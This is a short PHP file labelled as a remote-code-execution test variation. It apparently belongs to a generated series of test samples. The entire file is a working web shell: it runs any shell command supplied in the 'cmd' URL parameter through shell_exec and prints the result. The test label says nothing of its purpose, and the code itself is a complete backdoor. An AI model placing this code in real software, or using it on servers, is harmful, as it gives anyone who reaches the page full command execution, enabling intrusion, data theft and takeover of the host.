<?php
// RCE test variation #1193
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>